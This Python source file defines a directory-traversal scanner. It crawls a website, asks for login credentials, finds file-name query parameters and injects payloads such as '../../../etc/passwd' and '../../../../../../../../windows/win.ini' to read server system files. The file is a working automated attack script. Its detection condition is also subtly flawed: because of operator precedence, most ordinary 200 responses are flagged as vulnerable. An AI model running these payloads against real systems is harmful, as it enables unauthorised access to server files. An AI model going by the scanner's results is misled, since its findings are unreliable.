import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style
import re

class DirectoryTraversalScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.payloads = [
            "../../../etc/passwd",
            "../../etc/passwd",
            "../../../../../../../../windows/win.ini",
            "../..%2F..%2F..%2Fetc%2Fpasswd"
        ]

    def crawl_website(self):
        print(Fore.CYAN + "[*] Crawling website..." + Style.RESET_ALL)
        visited_urls = set()
        urls_to_visit = [self.base_url]
        internal_urls = []

        while urls_to_visit:
            current_url = urls_to_visit.pop(0)
            if current_url in visited_urls:
                continue
            visited_urls.add(current_url)

            try:
                response = self.session.get(current_url)
                soup = BeautifulSoup(response.text, 'html.parser')

                for link in soup.find_all('a', href=True):
                    url = urljoin(self.base_url, link['href'])
                    parsed_url = urlparse(url)
                    if self.base_url in url and url not in visited_urls and parsed_url.scheme in ['http', 'https']:
                        internal_urls.append(url)
                        urls_to_visit.append(url)
                print(Fore.GREEN + f"[+] Found page: {current_url}" + Style.RESET_ALL)

            except Exception as e:
                print(Fore.RED + f"[-] Error crawling {current_url}: {str(e)}" + Style.RESET_ALL)

        return internal_urls

    def handle_login(self, login_url):
        print(Fore.YELLOW + "[*] Login required" + Style.RESET_ALL)
        username = input("Enter username: ")
        password = input("Enter password: ")
        
        # Assuming a simple POST request for login
        login_data = {'username': username, 'password': password}
        response = self.session.post(login_url, data=login_data)

        if response.status_code == 200:
            print(Fore.GREEN + "[+] Login successful!" + Style.RESET_ALL)
        else:
            print(Fore.RED + "[-] Login failed!" + Style.RESET_ALL)

    def find_vulnerable_params(self, url):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        file_location_params = []

        for param, value in query_params.items():
            # Check if the value looks like a file path (contains a file extension)
            if re.search(r'\.\w{2,4}$', value[0]):
                file_location_params.append(param)

        return file_location_params

    def test_directory_traversal(self, url, params):
        vulnerabilities = []
        
        for param in params:
            for payload in self.payloads:
                # Replace the value of the parameter with the payload
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[param] = payload
                vulnerable_url = parsed_url._replace(query='&'.join([f'{k}={v[0]}' for k, v in query_params.items()])).geturl()

                try:
                    response = self.session.get(vulnerable_url)

                    # Check for directory traversal vulnerability indicators
                    if (response.status_code == 200 and
                            ("root:" in response.text or "bin:" in response.text or "bash" in response.text or 
                             "file not found" not in response.text and "404" not in response.text)):
                        vulnerabilities.append({
                            'url': url,
                            'parameter': param,
                            'payload': payload
                        })
                        print(Fore.RED + f"[!] Vulnerability found! URL: {vulnerable_url}" + Style.RESET_ALL)
                        break  # Exit after finding a vulnerability for this parameter

                except requests.RequestException as e:
                    print(Fore.RED + f"[-] Error testing {vulnerable_url}: {str(e)}" + Style.RESET_ALL)

        return vulnerabilities

    def scan(self):
        internal_pages = self.crawl_website()

        # Ask for login if needed
        if any('login' in url for url in internal_pages):
            login_url = next(url for url in internal_pages if 'login' in url)
            self.handle_login(login_url)

        vulnerabilities_report = []

        for page in internal_pages:
            print(Fore.CYAN + f"[*] Testing {page}..." + Style.RESET_ALL)
            params = self.find_vulnerable_params(page)

            if params:
                print(Fore.YELLOW + f"[!] Testing file location parameters: {', '.join(params)}" + Style.RESET_ALL)
                vulnerabilities = self.test_directory_traversal(page, params)
                vulnerabilities_report.extend(vulnerabilities)
            else:
                print(Fore.YELLOW + f"[!] No file location parameters found in {page}" + Style.RESET_ALL)

        # Print the final report
        print(Fore.MAGENTA + "\n[***] Detailed Scan Report [***]" + Style.RESET_ALL)

        if vulnerabilities_report:
            print(Fore.GREEN + "Vulnerabilities Found:" + Style.RESET_ALL)
            for vuln in vulnerabilities_report:
                print(f" - URL: {vuln['url']}, Parameter: {vuln['parameter']}, Payload: {vuln['payload']}")
        else:
            print(Fore.RED + " - No vulnerabilities found." + Style.RESET_ALL)